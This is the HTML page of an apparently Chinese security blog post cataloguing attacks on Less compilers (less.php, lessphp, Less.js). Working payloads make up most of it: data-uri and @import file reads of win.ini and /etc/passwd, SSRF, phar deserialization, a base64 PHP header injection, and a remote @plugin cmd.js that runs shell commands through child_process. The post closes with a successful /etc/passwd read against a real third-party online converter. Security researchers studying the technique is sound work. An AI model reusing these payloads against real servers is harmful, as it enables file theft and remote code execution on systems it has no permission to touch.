@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ltmthink.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="简介 Less是一个完全兼容CSS的语言 并在CSS的基础上提供了很多高级语法与功能，比如CSS中不支持的条件判断与循环，相当于是CSS语言的超集。 前端开发者使用Less编写的程序，可以通过编译器转换成合法的CSS语法，提供给浏览器进行渲染。 常见的编译器有nodejs的Less.js、php的less.php Less.php漏洞 环境安装: 12345#使用composer安装compose">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Less编译器漏洞汇总">
+<meta property="og:url" content="https://ltmthink.github.io/2024/04/14/Less%E7%BC%96%E8%AF%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="LtmThink">
+<meta property="og:description" content="简介 Less是一个完全兼容CSS的语言 并在CSS的基础上提供了很多高级语法与功能，比如CSS中不支持的条件判断与循环，相当于是CSS语言的超集。 前端开发者使用Less编写的程序，可以通过编译器转换成合法的CSS语法，提供给浏览器进行渲染。 常见的编译器有nodejs的Less.js、php的less.php Less.php漏洞 环境安装: 12345#使用composer安装compose">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014027.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014028.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014029.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014030.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014032.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014033.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014034.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014035.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014036.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014037.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014038.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014039.png">
+<meta property="og:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014040.png">
+<meta property="article:published_time" content="2024-04-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-14T16:20:45.950Z">
+<meta property="article:author" content="LtmThink">
+<meta property="article:tag" content="less漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014027.png">
+
+<link rel="canonical" href="https://ltmthink.github.io/2024/04/14/Less%E7%BC%96%E8%AF%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Less编译器漏洞汇总 | LtmThink</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a target="_blank" rel="noopener" href="https://github.com/LtmThink" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LtmThink</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">LtmThink的个人博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ltmthink.github.io/2024/04/14/Less%E7%BC%96%E8%AF%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LtmThink">
+      <meta itemprop="description" content="LtmThink的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LtmThink">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Less编译器漏洞汇总
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-14 00:00:00" itemprop="dateCreated datePublished" datetime="2024-04-14T00:00:00+08:00">2024-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-04-15 00:20:45" itemprop="dateModified" datetime="2024-04-15T00:20:45+08:00">2024-04-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/less%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">less漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/less%E6%BC%8F%E6%B4%9E/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="简介">简介</h2>
+<p><a target="_blank" rel="noopener" href="https://lesscss.org/">Less</a>是一个完全兼容CSS的语言</p>
+<p>并在CSS的基础上提供了很多高级语法与功能，比如CSS中不支持的条件判断与循环，相当于是CSS语言的超集。</p>
+<p>前端开发者使用Less编写的程序，可以通过<mark>编译器</mark>转换成合法的CSS语法，提供给浏览器进行渲染。</p>
+<p>常见的编译器有nodejs的Less.js、php的less.php</p>
+<h2 id="Less-php漏洞">Less.php漏洞</h2>
+<h4 id="环境安装">环境安装:</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#使用composer安装</span><br><span class="line">composer require oyejorge/less.php</span><br><span class="line"></span><br><span class="line">#使用时只需包含php文件</span><br><span class="line">require &#x27;vendor/autoload.php&#x27;;</span><br></pre></td></tr></table></figure>
+<h4 id="任意文件读取">任意文件读取</h4>
+<h5 id="data-uri">data-uri</h5>
+<p>在less官网可以看到一个函数<a target="_blank" rel="noopener" href="https://lesscss.org/functions/#misc-functions-data-uri">data-uri</a>，该函数用于读取文件并转换成data协议输出在css中</p>
+<p>我们再看到分析<code>less.php</code>是如何处理该函数的，在Functions.php的第851行我们可以看到如下处理代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function datauri( $mimetypeNode, $filePathNode = null ) &#123;</span><br><span class="line">    $filePath = ( $filePathNode ? $filePathNode-&gt;value : null );</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    if ( file_exists( $filePath ) ) &#123;</span><br><span class="line">        $buf = @file_get_contents( $filePath );</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $buf = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是一个可以控制完整路径的文件读取漏洞</p>
+<p>所以我们只需构造如下<mark>less</mark>代码交给Less.php解析即可读取任意文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">.test &#123;</span><br><span class="line">  content: data-uri(&#x27;C:\Windows\win.ini&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014027.png" alt="image-20240414150310573"></p>
+<h5 id="import">@import</h5>
+<p>在CSS或Less中，<a target="_blank" rel="noopener" href="https://lesscss.org/features/#import-atrules-feature"><code>@import</code></a>用于导入外部CSS，类似于PHP中的include。当在服务器端处理Less代码时，这可用于SSRF和本地文件泄露。</p>
+<p>分析源码在Import.php的第171行我们可以发现如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if( $this-&gt;options[&#x27;inline&#x27;] )&#123;</span><br><span class="line">			Less_Parser::AddParsedFile($full_path);</span><br><span class="line">			$contents = new Less_Tree_Anonymous( file_get_contents($full_path), 0, array(), true );</span><br><span class="line">			....</span><br><span class="line">			....</span><br></pre></td></tr></table></figure>
+<p>只要选项是<code>$this-&gt;options['inline']</code>为<code>True</code>即可没有限制的<code>file_get_contents($full_path)</code>，而在<code>@import</code>语句后面指定<code>inline</code>选项即可使得条件成立。</p>
+<p>所以我们也可以通过@import读取到文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;less/vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&lt;&lt;&lt;&#x27;CSS&#x27;</span></span><br><span class="line"><span class="string">@import (inline) &quot;C:\Windows\win.ini&quot;;</span></span><br><span class="line"><span class="string">CSS</span>;</span><br><span class="line"><span class="variable">$parser</span> = <span class="keyword">new</span> <span class="title class_">Less_Parser</span>();</span><br><span class="line"><span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$css</span>= <span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">getCss</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$css</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="SSRF">SSRF</h4>
+<h5 id="import-2">@import</h5>
+<p>在<code>@import</code>中无限制的<code>file_get_contents</code>可以用来访问url，从而造成SSRF漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">@import (inline) &quot;http://localhost/test.html&quot;;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014028.png" alt="image-20240414152206716"></p>
+<h4 id="phar反序列化">phar反序列化</h4>
+<h5 id="data-uri-2">data-uri</h5>
+<p>在上面的源码中我们可以看到<code>data-uri</code>处理时先会<code>file_exists( $filePath )</code>进行判断，而<code>file_exists</code>是可以解析phar的</p>
+<p>所以我们就可以利用这一点进行<code>phar反序列化</code>的利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">.test &#123;</span><br><span class="line">  content: data-uri(&#x27;phar:/./test.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<h4 id="文件头部写入">文件头部写入</h4>
+<h5 id="import-3">@import</h5>
+<p>在Less.php底层，<code>@import</code>时有如下判断逻辑：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>如果发现包含的文件是less，则对其进行编译解析，并将结果输出在当前文件中</p>
+</li>
+<li class="lvl-2">
+<p>如果发现包含的文件是css，则不对其进行处理，直接将<code>@import</code>这个语句输出在页面最前面</p>
+</li>
+</ul>
+<p>第二种情况可以“控制”文件头，虽然可控的内容只是一个<code>@import</code>语句。但我们<code>data:</code>协议来控制其写入任意的文件头部内容</p>
+<p>该方法只能控制css文件的头部,一般结合文件包含或者phar反序列化来使用。</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">.test &#123;</span><br><span class="line">  width: 1337px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@import (inline) &#x27;data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+&#x27;;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014029.png" alt="image-20240414161247820"></p>
+<h4 id="其他">其他</h4>
+<p>在寻找less.php的过程中,发现如下源码库<a target="_blank" rel="noopener" href="https://github.com/leafo/lessphp">https://github.com/leafo/lessphp</a></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014030.png" alt="image-20240414162756486"></p>
+<p>发现star数很多,但版本较老，根据安装提示下载了<a target="_blank" rel="noopener" href="https://github.com/leafo/lessphp/blob/master/lessc.inc.php">lessc.inc.php</a>并使用如下语句进行任意文件读取等漏洞测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;lessc.inc.php&quot;;</span><br><span class="line"></span><br><span class="line">$less = new lessc;</span><br><span class="line">echo $less-&gt;compile(&quot;.test &#123;content: data-uri(&#x27;C:/Windows/win.ini&#x27;);&#125;&quot;);</span><br></pre></td></tr></table></figure>
+<p>发现无法读取文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014032.png" alt="image-20240414163606332"></p>
+<p>跟进查看发现其对data-uri的实现是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">protected function lib_data_uri($value) &#123;</span><br><span class="line">    $mime = ($value[0] === &#x27;list&#x27;) ? $value[2][0][2] : null;</span><br><span class="line">    $url = ($value[0] === &#x27;list&#x27;) ? $value[2][1][2][0] : $value[2][0];</span><br><span class="line">    $fullpath = $this-&gt;findImport($url);</span><br><span class="line">    if ($fullpath &amp;&amp; ($fsize = filesize($fullpath)) !== false) &#123;</span><br><span class="line">    		.....</span><br><span class="line">    		.....</span><br><span class="line">            if (!is_null($mime)) // fallback if the mime type is still unknown</span><br><span class="line">                $url = sprintf(&#x27;data:%s;base64,%s&#x27;, $mime, base64_encode(file_get_contents($fullpath)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>findImport</code>会判断传入的url如果url末尾不存在<code>\</code>就在url的开头加上<code>\</code>，然后再判断路径是否存在，存在则返回路径，也就是说我们的url被解析为了<code>/C:/Windows/win.ini</code>，而这个文件是不存在的。所以<code>$fullpath </code>为空自然无法读取到文件。</p>
+<p>在linux下因为根目录为<code>/</code>所以这个问题不显著,且也可以解析<code>//etc/passwd</code></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014033.png" alt="image-20240414163953073"></p>
+<p>而在windows下<code>/</code>可以表示当前盘符,所以我们可以在路径前去掉盘符来读取任意文件,但这也只能读取当前盘符的文件了</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014034.png" alt="image-20240414164123730"></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014035.png" alt="image-20240414164327686"></p>
+<p>原因嘛…我猜测是less.php版本太低还没优化好</p>
+<h3 id="Less-js漏洞">Less.js漏洞</h3>
+<h4 id="环境安装-2">环境安装</h4>
+<p>官网:<a target="_blank" rel="noopener" href="https://lesscss.org/#">https://lesscss.org/#</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#使用官方文档的安装方法</span><br><span class="line">npm install -g less</span><br></pre></td></tr></table></figure>
+<h4 id="远程RCE">远程RCE</h4>
+<p>Less.js库支持插件，这些插件可以使用@plugin语法直接包含在远程的Less代码中。插件使用JavaScript编写，当Less代码被解释时，任何包含的插件都会执行。这可能会导致两种结果，具体取决于Less处理器的上下文。如果在客户端处理Less代码，则会导致跨站脚本攻击。如果在服务器端处理Less代码，则会导致远程代码执行。所有支持 @plugin语法的Less版本都容易受到攻击。</p>
+<p>原理是利用<code>@plugin</code>加载远程js代码(有格式要求)的功能配合nodejs的代码执行函数实现RCE</p>
+<p>新建一个<code>cmd.js</code>内容如下,将其上传到远程服务器并能被远程访问到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">registerPlugin(&#123;    </span><br><span class="line">     install: function(less, pluginManager, functions) &#123;        </span><br><span class="line">             functions.add(&#x27;cmd&#x27;, function(val) &#123;            </span><br><span class="line">                   return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(val.value).toString();        </span><br><span class="line">              &#125;);    </span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014036.png" alt="image-20240414161831555"></p>
+<p>构造<code>cmd.less</code>文件,内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@plugin &quot;http://your-ip:8888/cmd.js&quot;;</span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line">color: cmd(&#x27;whoami&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在命令行中执行以下指令,将less文件转换为css文件并执行恶意指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lessc cmd.less result.css</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014037.png" alt="image-20240414162105651"></p>
+<p>可以看到远程主机上的<code>cmd.js</code>被访问</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014038.png" alt="image-20240414162152774"></p>
+<h4 id="任意文件读取-2">任意文件读取</h4>
+<p>和less.php的两种读取方法构造的less文件相同</p>
+<h4 id="SSRF-2">SSRF</h4>
+<p>和less.php的ssrf构造的less文件相同</p>
+<h3 id="真实示例">真实示例</h3>
+<p>找到一个国外less-to-css的在线网站，测试使用data-uri读取任意文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014039.png" alt="image-20240414162522071"></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014040.png" alt="image-20240414162607853"></p>
+<p>成功读取到<code>/etc/passwd</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/less%E6%BC%8F%E6%B4%9E/" rel="tag"># less漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/20/Typora%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2023-2317)/" rel="prev" title="Typora远程代码执行漏洞分析(CVE-2023-2317)">
+      <i class="fa fa-chevron-left"></i> Typora远程代码执行漏洞分析(CVE-2023-2317)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
